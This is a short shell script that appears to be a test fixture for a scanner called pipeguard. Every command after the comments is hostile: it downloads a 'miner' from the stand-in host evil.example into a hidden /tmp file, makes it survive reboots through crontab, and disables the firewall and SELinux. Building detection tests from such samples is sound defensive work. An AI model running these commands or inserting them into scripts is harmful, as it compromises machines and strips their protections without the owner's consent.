#!/bin/sh
# TEST SAMPLE ONLY - never execute. Used by pipeguard's test suite.
# Drops a hidden "miner" in /tmp, makes it survive reboots, lowers defences.
wget -q http://evil.example/miner -O /tmp/.cache-update
chmod +x /tmp/.cache-update
(crontab -l 2>/dev/null; echo "@reboot /tmp/.cache-update") | crontab -
sudo ufw disable
sudo setenforce 0
